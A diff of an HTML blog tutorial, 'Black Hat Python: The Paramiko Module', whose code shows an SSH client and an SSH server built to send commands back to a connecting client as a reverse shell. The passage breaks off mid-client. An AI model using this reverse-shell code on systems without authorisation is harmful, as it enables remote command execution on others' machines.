@@ -5,7 +5,7 @@
     <title>Black Hat Python: The Paramiko Module</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta name="description" content="">
-    <meta name="author" content="Marina von Steinkirch">
+    <meta name="author" content="Mia von Steinkirch">
 
     <!-- Le styles -->
     <link rel="stylesheet" href="./theme/css/bootstrap.dark.css" type="text/css" />
@@ -97,7 +97,7 @@
                 <div class="entry-content">
                 <div class="well">
 <footer class="post-info">
-<abbr class="published" title="2014-12-13T00:00:00-05:00">
+<abbr class="published" title="2014-12-13T00:00:00">
       Sat 13 December 2014 </abbr>
 
 <span class="label"> Category</span>
@@ -118,32 +118,32 @@
 <p><strong>Paramiko</strong> is awesome!!! It uses my dear <a href="https://www.dlitz.net/software/pycrypto/">PyCrypto</a> to give us access to the <a href="http://en.wikipedia.org/wiki/SSH2">SSH2 protocol</a>, and it has a flexible and easy to use API.</p>
 <p>You are going to see it with your own eyes: in this post we will see code for SSH clients and servers, reverse shells, and tunnel connections, and it will be smooth and fun (and remember that my source codes are available in my <a href="https://github.com/bt3gl/My-Gray-Hacker-Resources">github repo</a>)!</p>
 <p>Shall we start?</p>
-<hr>
+<hr />
 <h2>A Simple SSH Client</h2>
 <p>The first program we are going to write is a SSH client that makes a connection to some available SSH server, and then runs a single command that we send to it.</p>
 <p>But before we start, make sure you have  <strong>paramiko</strong> installed in our environment:</p>
-<div class="highlight"><pre><span></span>$ sudo pip install paramiko
+<div class="highlight"><pre><span class="nv">$ </span>sudo pip install paramiko
 </pre></div>
 
 
 <h3>Writing the SSH  Client Script</h3>
 <p>Now we are ready to create our script. We start with a <strong>usage</strong> function. Since <strong>paramiko</strong> supports authentication with both a password and/or an identity file (a key), our usage function shows how to send these arguments when we run the script (plus the port, username, and the command we want to run):</p>
-<div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">usage</span><span class="p">():</span>
-    <span class="k">print</span> <span class="s2">&quot;Usage: ssh_client.py  &lt;IP&gt; -p &lt;PORT&gt; -u &lt;USER&gt; -c &lt;COMMAND&gt; -a &lt;PASSWORD&gt; -k &lt;KEY&gt; -c &lt;COMMAND&gt;&quot;</span>
-    <span class="k">print</span> <span class="s2">&quot;  -a                  password authentication&quot;</span>
-    <span class="k">print</span> <span class="s2">&quot;  -i                  identity file location&quot;</span>
-    <span class="k">print</span> <span class="s2">&quot;  -c                  command to be issued&quot;</span>
-    <span class="k">print</span> <span class="s2">&quot;  -p                  specify the port&quot;</span>
-    <span class="k">print</span> <span class="s2">&quot;  -u                  specify the username&quot;</span>
+<div class="highlight"><pre><span class="k">def</span> <span class="nf">usage</span><span class="p">():</span>
+    <span class="k">print</span> <span class="s">&quot;Usage: ssh_client.py  &lt;IP&gt; -p &lt;PORT&gt; -u &lt;USER&gt; -c &lt;COMMAND&gt; -a &lt;PASSWORD&gt; -k &lt;KEY&gt; -c &lt;COMMAND&gt;&quot;</span>
+    <span class="k">print</span> <span class="s">&quot;  -a                  password authentication&quot;</span>
+    <span class="k">print</span> <span class="s">&quot;  -i                  identity file location&quot;</span>
+    <span class="k">print</span> <span class="s">&quot;  -c                  command to be issued&quot;</span>
+    <span class="k">print</span> <span class="s">&quot;  -p                  specify the port&quot;</span>
+    <span class="k">print</span> <span class="s">&quot;  -u                  specify the username&quot;</span>
     <span class="k">print</span>
-    <span class="k">print</span> <span class="s2">&quot;Examples:&quot;</span>
-    <span class="k">print</span> <span class="s2">&quot;ssh_client.py 129.49.76.26 -u buffy -p 22 -a killvampires  -c pwd&quot;</span>
+    <span class="k">print</span> <span class="s">&quot;Examples:&quot;</span>
+    <span class="k">print</span> <span class="s">&quot;ssh_client.py 129.49.76.26 -u buffy -p 22 -a killvampires  -c pwd&quot;</span>
     <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
 </pre></div>
 
 
 <p>Moving to the <strong>main</strong> function, we are going to use <strong>getopt</strong> module to parse the arguments. That's basically what the main function does: parse the arguments, sending them to the <strong>ssh_client</strong> function:</p>
-<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">paramiko</span>
+<div class="highlight"><pre><span class="kn">import</span> <span class="nn">paramiko</span>
 <span class="kn">import</span> <span class="nn">sys</span>
 <span class="kn">import</span> <span class="nn">getopt</span>
 
@@ -151,56 +151,56 @@
     <span class="k">if</span> <span class="ow">not</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">:]):</span>
         <span class="n">usage</span><span class="p">()</span>
 
-    <span class="n">IP</span> <span class="o">=</span> <span class="s1">&#39;0.0.0.0&#39;</span>
-    <span class="n">USER</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
-    <span class="n">PASSWORD</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
-    <span class="n">KEY</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
-    <span class="n">COMMAND</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+    <span class="n">IP</span> <span class="o">=</span> <span class="s">&#39;0.0.0.0&#39;</span>
+    <span class="n">USER</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
+    <span class="n">PASSWORD</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
+    <span class="n">KEY</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
+    <span class="n">COMMAND</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
     <span class="n">PORT</span> <span class="o">=</span> <span class="mi">0</span>
 
     <span class="k">try</span><span class="p">:</span>
-        <span class="n">opts</span> <span class="o">=</span> <span class="n">getopt</span><span class="o">.</span><span class="n">getopt</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">:],</span><span class="s2">&quot;p:u:a:i:c:&quot;</span><span class="p">,</span> \
-            <span class="p">[</span><span class="s2">&quot;PORT&quot;</span><span class="p">,</span> <span class="s2">&quot;USER&quot;</span><span class="p">,</span> <span class="s2">&quot;PASSWORD&quot;</span><span class="p">,</span> <span class="s2">&quot;KEY&quot;</span><span class="p">,</span> <span class="s2">&quot;COMMAND&quot;</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
+        <span class="n">opts</span> <span class="o">=</span> <span class="n">getopt</span><span class="o">.</span><span class="n">getopt</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">:],</span><span class="s">&quot;p:u:a:i:c:&quot;</span><span class="p">,</span> \
+            <span class="p">[</span><span class="s">&quot;PORT&quot;</span><span class="p">,</span> <span class="s">&quot;USER&quot;</span><span class="p">,</span> <span class="s">&quot;PASSWORD&quot;</span><span class="p">,</span> <span class="s">&quot;KEY&quot;</span><span class="p">,</span> <span class="s">&quot;COMMAND&quot;</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
     <span class="k">except</span> <span class="n">getopt</span><span class="o">.</span><span class="n">GetoptError</span> <span class="k">as</span> <span class="n">err</span><span class="p">:</span>
         <span class="k">print</span> <span class="nb">str</span><span class="p">(</span><span class="n">err</span><span class="p">)</span>
         <span class="n">usage</span><span class="p">()</span>
 
     <span class="n">IP</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
-    <span class="k">print</span> <span class="s2">&quot;[*] Initializing connection to &quot;</span> <span class="o">+</span> <span class="n">IP</span>
+    <span class="k">print</span> <span class="s">&quot;[*] Initializing connection to &quot;</span> <span class="o">+</span> <span class="n">IP</span>
 
-    <span class="c1"># Handle the options and arguments</span>
+    <span class="c"># Handle the options and arguments</span>
     <span class="k">for</span> <span class="n">t</span> <span class="ow">in</span> <span class="n">opts</span><span class="p">:</span>
-        <span class="k">if</span> <span class="n">t</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="ow">in</span> <span class="p">(</span><span class="s1">&#39;-a&#39;</span><span class="p">):</span>
+        <span class="k">if</span> <span class="n">t</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="ow">in</span> <span class="p">(</span><span class="s">&#39;-a&#39;</span><span class="p">):</span>
             <span class="n">PASSWORD</span> <span class="o">=</span> <span class="n">t</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
-        <span class="k">elif</span> <span class="n">t</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="ow">in</span> <span class="p">(</span><span class="s1">&#39;-i&#39;</span><span class="p">):</span>
+        <span class="k">elif</span> <span class="n">t</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="ow">in</span> <span class="p">(</span><span class="s">&#39;-i&#39;</span><span class="p">):</span>
             <span class="n">KEY</span> <span class="o">=</span> <span class="n">t</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
-        <span class="k">elif</span> <span class="n">t</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="ow">in</span> <span class="p">(</span><span class="s1">&#39;-c&#39;</span><span class="p">):</span>
+        <span class="k">elif</span> <span class="n">t</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="ow">in</span> <span class="p">(</span><span class="s">&#39;-c&#39;</span><span class="p">):</span>
             <span class="n">COMMAND</span> <span class="o">=</span> <span class="n">t</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
-        <span class="k">elif</span> <span class="n">t</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="ow">in</span> <span class="p">(</span><span class="s1">&#39;-p&#39;</span><span class="p">):</span>
+        <span class="k">elif</span> <span class="n">t</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="ow">in</span> <span class="p">(</span><span class="s">&#39;-p&#39;</span><span class="p">):</span>
             <span class="n">PORT</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">t</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
-        <span class="k">elif</span> <span class="n">t</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="ow">in</span> <span class="p">(</span><span class="s1">&#39;-u&#39;</span><span class="p">):</span>
+        <span class="k">elif</span> <span class="n">t</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="ow">in</span> <span class="p">(</span><span class="s">&#39;-u&#39;</span><span class="p">):</span>
             <span class="n">USER</span> <span class="o">=</span> <span class="n">t</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
         <span class="k">else</span><span class="p">:</span>
-            <span class="k">print</span> <span class="s2">&quot;This option does not exist!&quot;</span>
+            <span class="k">print</span> <span class="s">&quot;This option does not exist!&quot;</span>
             <span class="n">usage</span><span class="p">()</span>
     <span class="k">if</span> <span class="n">USER</span><span class="p">:</span>
-        <span class="k">print</span> <span class="s2">&quot;[*] User set to &quot;</span> <span class="o">+</span> <span class="n">USER</span>
+        <span class="k">print</span> <span class="s">&quot;[*] User set to &quot;</span> <span class="o">+</span> <span class="n">USER</span>
     <span class="k">if</span> <span class="n">PORT</span><span class="p">:</span>
-        <span class="k">print</span> <span class="s2">&quot;[*] The port to be used is </span><span class="si">%d</span><span class="s2">. &quot;</span> <span class="o">%</span> <span class="n">PORT</span>
+        <span class="k">print</span> <span class="s">&quot;[*] The port to be used is </span><span class="si">%d</span><span class="s">. &quot;</span> <span class="o">%</span> <span class="n">PORT</span>
     <span class="k">if</span> <span class="n">PASSWORD</span><span class="p">:</span>
-        <span class="k">print</span> <span class="s2">&quot;[*] A password with length </span><span class="si">%d</span><span class="s2"> was submitted. &quot;</span> <span class="o">%</span><span class="nb">len</span><span class="p">(</span><span class="n">PASSWORD</span><span class="p">)</span>
+        <span class="k">print</span> <span class="s">&quot;[*] A password with length </span><span class="si">%d</span><span class="s"> was submitted. &quot;</span> <span class="o">%</span><span class="nb">len</span><span class="p">(</span><span class="n">PASSWORD</span><span class="p">)</span>
     <span class="k">if</span> <span class="n">KEY</span><span class="p">:</span>
-        <span class="k">print</span> <span class="s2">&quot;[*] The key at </span><span class="si">%s</span><span class="s2"> will be used.&quot;</span> <span class="o">%</span> <span class="n">KEY</span>
+        <span class="k">print</span> <span class="s">&quot;[*] The key at </span><span class="si">%s</span><span class="s"> will be used.&quot;</span> <span class="o">%</span> <span class="n">KEY</span>
     <span class="k">if</span> <span class="n">COMMAND</span><span class="p">:</span>
-        <span class="k">print</span> <span class="s2">&quot;[*] Executing the command &#39;</span><span class="si">%s</span><span class="s2">&#39; in the host...&quot;</span> <span class="o">%</span> <span class="n">COMMAND</span>
+        <span class="k">print</span> <span class="s">&quot;[*] Executing the command &#39;</span><span class="si">%s</span><span class="s">&#39; in the host...&quot;</span> <span class="o">%</span> <span class="n">COMMAND</span>
     <span class="k">else</span><span class="p">:</span>
-        <span class="k">print</span> <span class="s2">&quot;You need to specify the command to the host.&quot;</span>
+        <span class="k">print</span> <span class="s">&quot;You need to specify the command to the host.&quot;</span>
         <span class="n">usage</span><span class="p">()</span>
 
-    <span class="c1"># start the client</span>
+    <span class="c"># start the client</span>
     <span class="n">ssh_client</span><span class="p">(</span><span class="n">IP</span><span class="p">,</span> <span class="n">PORT</span><span class="p">,</span> <span class="n">USER</span><span class="p">,</span> <span class="n">PASSWORD</span><span class="p">,</span> <span class="n">KEY</span><span class="p">,</span> <span class="n">COMMAND</span><span class="p">)</span>
 
-<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">&#39;__main__&#39;</span><span class="p">:</span>
     <span class="n">main</span><span class="p">()</span>
 </pre></div>
 
@@ -213,7 +213,7 @@
 <li>Checks whether this section is active and runs the command we sent.</li>
 </ol>
 <p>Let's see how this works in the code:</p>
-<div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">ssh_client</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">user</span><span class="p">,</span> <span class="n">passwd</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">command</span><span class="p">):</span>
+<div class="highlight"><pre><span class="k">def</span> <span class="nf">ssh_client</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">user</span><span class="p">,</span> <span class="n">passwd</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">command</span><span class="p">):</span>
     <span class="n">client</span> <span class="o">=</span> <span class="n">paramiko</span><span class="o">.</span><span class="n">SSHClient</span><span class="p">()</span>
 
     <span class="k">if</span> <span class="n">key</span><span class="p">:</span>
@@ -234,32 +234,32 @@
 <p>Easy, huh?</p>
 <h3>Running the Script</h3>
 <p>We are ready to run our script. If we use the example in the usage function (and supposing the account exists in that host), we will see the following:</p>
-<div class="highlight"><pre><span></span>$ ssh_client.py <span class="m">129</span>.49.76.26 -u buffy -p <span class="m">22</span> -a killvampires  -c <span class="nb">pwd</span>
-<span class="o">[</span>*<span class="o">]</span> Initializing connection to <span class="m">129</span>.49.76.26
-<span class="o">[</span>*<span class="o">]</span> User <span class="nb">set</span> to buffy
-<span class="o">[</span>*<span class="o">]</span> The port to be used is <span class="m">22</span>.
-<span class="o">[</span>*<span class="o">]</span> A password with length <span class="m">12</span> was submitted.
+<div class="highlight"><pre><span class="nv">$ </span>ssh_client.py 129.49.76.26 -u buffy -p 22 -a killvampires  -c <span class="nb">pwd</span>
+<span class="o">[</span>*<span class="o">]</span> Initializing connection to 129.49.76.26
+<span class="o">[</span>*<span class="o">]</span> User <span class="nb">set </span>to buffy
+<span class="o">[</span>*<span class="o">]</span> The port to be used is 22.
+<span class="o">[</span>*<span class="o">]</span> A password with length 12 was submitted.
 <span class="o">[</span>*<span class="o">]</span> Executing the <span class="nb">command</span> <span class="s1">&#39;pwd&#39;</span> in the host...
 
 /home/buffy.
 </pre></div>
 
 
-<hr>
+<hr />
 <h2>A SSH Server to Reverse a Client Shell</h2>
 <p>What if we also control the SSH server and we are able to send commands to our SSH client? This is exactly what we are going to do now: we are going to write a <strong>class</strong> for this server (with a little help of the <strong>socket</strong> module) and then we will be able to <strong>reverse the shell</strong>!</p>
 <p>As a note, this script is based in some of the <a href="https://github.com/paramiko/paramiko/blob/master/demo">paramiko demos</a> and we specifically use the key from their demo files (<a href="https://github.com/paramiko/paramiko/blob/master/demos/test_rsa.key">download here</a>).</p>
 <h3>The SSH Server</h3>
 <p>In our server script, we first  create a class <strong>Server</strong> that issues a new thread event, checking whether the session is valid, and performing authentication. Notice that for simplicity we are hard-coding the values for username, password and host key, which is never a good practice:</p>
-<div class="highlight"><pre><span></span><span class="n">HOST_KEY</span> <span class="o">=</span> <span class="n">paramiko</span><span class="o">.</span><span class="n">RSAKey</span><span class="p">(</span><span class="n">filename</span><span class="o">=</span><span class="s1">&#39;test_rsa.key&#39;</span><span class="p">)</span>
-<span class="n">USERNAME</span> <span class="o">=</span> <span class="s1">&#39;buffy&#39;</span>
-<span class="n">PASSWORD</span> <span class="o">=</span> <span class="s1">&#39;killvampires&#39;</span>
+<div class="highlight"><pre><span class="n">HOST_KEY</span> <span class="o">=</span> <span class="n">paramiko</span><span class="o">.</span><span class="n">RSAKey</span><span class="p">(</span><span class="n">filename</span><span class="o">=</span><span class="s">&#39;test_rsa.key&#39;</span><span class="p">)</span>
+<span class="n">USERNAME</span> <span class="o">=</span> <span class="s">&#39;buffy&#39;</span>
+<span class="n">PASSWORD</span> <span class="o">=</span> <span class="s">&#39;killvampires&#39;</span>
 
 <span class="k">class</span> <span class="nc">Server</span><span class="p">(</span><span class="n">paramiko</span><span class="o">.</span><span class="n">ServerInterface</span><span class="p">):</span>
-    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
         <span class="bp">self</span><span class="o">.</span><span class="n">event</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">Event</span><span class="p">()</span>
     <span class="k">def</span> <span class="nf">check_channel_request</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">kind</span><span class="p">,</span> <span class="n">chanid</span><span class="p">):</span>
-        <span class="k">if</span> <span class="n">kind</span> <span class="o">==</span> <span class="s1">&#39;session&#39;</span><span class="p">:</span>
+        <span class="k">if</span> <span class="n">kind</span> <span class="o">==</span> <span class="s">&#39;session&#39;</span><span class="p">:</span>
             <span class="k">return</span> <span class="n">paramiko</span><span class="o">.</span><span class="n">OPEN_SUCCEEDED</span>
         <span class="k">return</span> <span class="n">paramiko</span><span class="o">.</span><span class="n">OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED</span>
     <span class="k">def</span> <span class="nf">check_auth_password</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">):</span>
@@ -277,7 +277,7 @@
 <li>Authentication is attempted. If it is successful, we get a <strong>ClientConnected</strong> message.</li>
 <li>The server starts a loop where it will keep getting  input commands from the user and issuing it in the client. This is our reversed  shell!</li>
 </ol>
-<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">paramiko</span>
+<div class="highlight"><pre><span class="kn">import</span> <span class="nn">paramiko</span>
 <span class="kn">import</span> <span class="nn">getopt</span>
 <span class="kn">import</span> <span class="nn">threading</span>
 <span class="kn">import</span> <span class="nn">sys</span>
@@ -285,10 +285,10 @@
 
 <span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
     <span class="k">if</span> <span class="ow">not</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">:]):</span>
-        <span class="k">print</span> <span class="s2">&quot;Usage: ssh_server.py &lt;SERVER&gt;  &lt;PORT&gt;&quot;</span>
+        <span class="k">print</span> <span class="s">&quot;Usage: ssh_server.py &lt;SERVER&gt;  &lt;PORT&gt;&quot;</span>
         <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
 
-    <span class="c1"># creating a socket object</span>
+    <span class="c"># creating a socket object</span>
     <span class="n">server</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
     <span class="n">ssh_port</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>
     <span class="k">try</span><span class="p">:</span>
@@ -296,49 +296,49 @@
         <span class="n">sock</span><span class="o">.</span><span class="n">setsockopt</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">SOL_SOCKET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SO_REUSEADDR</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
         <span class="n">sock</span><span class="o">.</span><span class="n">bind</span><span class="p">((</span><span class="n">server</span><span class="p">,</span> <span class="n">ssh_port</span><span class="p">))</span>
         <span class="n">sock</span><span class="o">.</span><span class="n">listen</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span>
-        <span class="k">print</span> <span class="s2">&quot;[+] Listening for connection ...&quot;</span>
+        <span class="k">print</span> <span class="s">&quot;[+] Listening for connection ...&quot;</span>
         <span class="n">client</span><span class="p">,</span> <span class="n">addr</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">accept</span><span class="p">()</span>
     <span class="k">except</span> <span class="ne">Exception</span><span class="p">,</span> <span class="n">e</span><span class="p">:</span>
-        <span class="k">print</span> <span class="s2">&quot;[-] Connection Failed: &quot;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
+        <span class="k">print</span> <span class="s">&quot;[-] Connection Failed: &quot;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
         <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
-    <span class="k">print</span> <span class="s2">&quot;[+] Connection Established!&quot;</span>
+    <span class="k">print</span> <span class="s">&quot;[+] Connection Established!&quot;</span>
 
-    <span class="c1"># creating a paramiko object</span>
+    <span class="c"># creating a paramiko object</span>
     <span class="k">try</span><span class="p">:</span>
         <span class="n">Session</span> <span class="o">=</span> <span class="n">paramiko</span><span class="o">.</span><span class="n">Transport</span><span class="p">(</span><span class="n">client</span><span class="p">)</span>
         <span class="n">Session</span><span class="o">.</span><span class="n">add_server_key</span><span class="p">(</span><span class="n">HOST_KEY</span><span class="p">)</span>
-        <span class="n">paramiko</span><span class="o">.</span><span class="n">util</span><span class="o">.</span><span class="n">log_to_file</span><span class="p">(</span><span class="s2">&quot;filename.log&quot;</span><span class="p">)</span>
+        <span class="n">paramiko</span><span class="o">.</span><span class="n">util</span><span class="o">.</span><span class="n">log_to_file</span><span class="p">(</span><span class="s">&quot;filename.log&quot;</span><span class="p">)</span>
         <span class="n">server</span> <span class="o">=</span> <span class="n">Server</span><span class="p">()</span>
         <span class="k">try</span><span class="p">:</span>
             <span class="n">Session</span><span class="o">.</span><span class="n">start_server</span><span class="p">(</span><span class="n">server</span><span class="o">=</span><span class="n">server</span><span class="p">)</span>
         <span class="k">except</span> <span class="n">paramiko</span><span class="o">.</span><span class="n">SSHException</span><span class="p">,</span> <span class="n">x</span><span class="p">:</span>
-            <span class="k">print</span> <span class="s1">&#39;[-] SSH negotiation failed.&#39;</span>
+            <span class="k">print</span> <span class="s">&#39;[-] SSH negotiation failed.&#39;</span>
         <span class="n">chan</span> <span class="o">=</span> <span class="n">Session</span><span class="o">.</span><span class="n">accept</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>
-        <span class="k">print</span> <span class="s1">&#39;[+] Authenticated!&#39;</span>
-        <span class="n">chan</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s2">&quot;Welcome to Buffy&#39;s SSH&quot;</span><span class="p">)</span>
+        <span class="k">print</span> <span class="s">&#39;[+] Authenticated!&#39;</span>
+        <span class="n">chan</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;Welcome to Buffy&#39;s SSH&quot;</span><span class="p">)</span>
         <span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
             <span class="k">try</span><span class="p">:</span>
-                <span class="n">command</span> <span class="o">=</span> <span class="nb">raw_input</span><span class="p">(</span><span class="s2">&quot;Enter command: &quot;</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
-                <span class="k">if</span> <span class="n">command</span> <span class="o">!=</span> <span class="s1">&#39;exit&#39;</span><span class="p">:</span>
+                <span class="n">command</span> <span class="o">=</span> <span class="nb">raw_input</span><span class="p">(</span><span class="s">&quot;Enter command: &quot;</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">(</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
+                <span class="k">if</span> <span class="n">command</span> <span class="o">!=</span> <span class="s">&#39;exit&#39;</span><span class="p">:</span>
                     <span class="n">chan</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>
-                    <span class="k">print</span> <span class="n">chan</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span>
+                    <span class="k">print</span> <span class="n">chan</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span>
                 <span class="k">else</span><span class="p">:</span>
-                    <span class="n">chan</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s1">&#39;exit&#39;</span><span class="p">)</span>
-                    <span class="k">print</span> <span class="s1">&#39;[*] Exiting ...&#39;</span>
+                    <span class="n">chan</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;exit&#39;</span><span class="p">)</span>
+                    <span class="k">print</span> <span class="s">&#39;[*] Exiting ...&#39;</span>
                     <span class="n">session</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
-                    <span class="k">raise</span> <span class="ne">Exception</span><span class="p">(</span><span class="s1">&#39;exit&#39;</span><span class="p">)</span>
+                    <span class="k">raise</span> <span class="ne">Exception</span><span class="p">(</span><span class="s">&#39;exit&#39;</span><span class="p">)</span>
             <span class="k">except</span> <span class="ne">KeyboardInterrupt</span><span class="p">:</span>
                 <span class="n">session</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
 
     <span class="k">except</span> <span class="ne">Exception</span><span class="p">,</span> <span class="n">e</span><span class="p">:</span>
-        <span class="k">print</span> <span class="s2">&quot;[-] Caught exception: &quot;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
+        <span class="k">print</span> <span class="s">&quot;[-] Caught exception: &quot;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
         <span class="k">try</span><span class="p">:</span>
             <span class="n">session</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
         <span class="k">except</span><span class="p">:</span>
             <span class="k">pass</span>
         <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
 
-<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">&#39;__main__&#39;</span><span class="p">:</span>
     <span class="n">main</span><span class="p">()</span>
 </pre></div>
 
@@ -346,19 +346,19 @@
 <h3>The SSH Client</h3>
 <p>The last piece for our reversed shell is to make the SSH client to be able to receive commands from the server.</p>
 <p>We are going to adapt the previous client script to receive these commands. All we need to do is to add a loop inside the session:</p>
-<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">paramiko</span>
+<div class="highlight"><pre><span class="kn">import</span> <span class="nn">paramiko</span>
 <span class="kn">import</span> <span class="nn">sys</span>
 <span class="kn">import</span> <span class="nn">getopt</span>
 <span class="kn">import</span> <span class="nn">subprocess</span>
 
 <span class="k">def</span> <span class="nf">usage</span><span class="p">():</span>
-    <span class="k">print</span> <span class="s2">&quot;Usage: ssh_client.py  &lt;IP&gt; -p &lt;PORT&gt; -u &lt;USER&gt; -c &lt;COMMAND&gt; -a &lt;PASSWORD&gt;&quot;</span>
-    <span class="k">print</span> <span class="s2">&quot;  -a                  password authentication&quot;</span>
-    <span class="k">print</span> <span class="s2">&quot;  -p                  specify the port&quot;</span>
-    <span class="k">print</span> <span class="s2">&quot;  -u                  specify the username&quot;</span>
+    <span class="k">print</span> <span class="s">&quot;Usage: ssh_client.py  &lt;IP&gt; -p &lt;PORT&gt; -u &lt;USER&gt; -c &lt;COMMAND&gt; -a &lt;PASSWORD&gt;&quot;</span>
+    <span class="k">print</span> <span class="s">&quot;  -a                  password authentication&quot;</span>
+    <span class="k">print</span> <span class="s">&quot;  -p                  specify the port&quot;</span>
+    <span class="k">print</span> <span class="s">&quot;  -u                  specify the username&quot;</span>
     <span class="k">print</span>
-    <span class="k">print</span> <span class="s2">&quot;Examples:&quot;</span>
-    <span class="k">print</span> <span class="s2">&quot;ssh_client.py localhost -u buffy -p 22 -a killvampires&quot;</span>
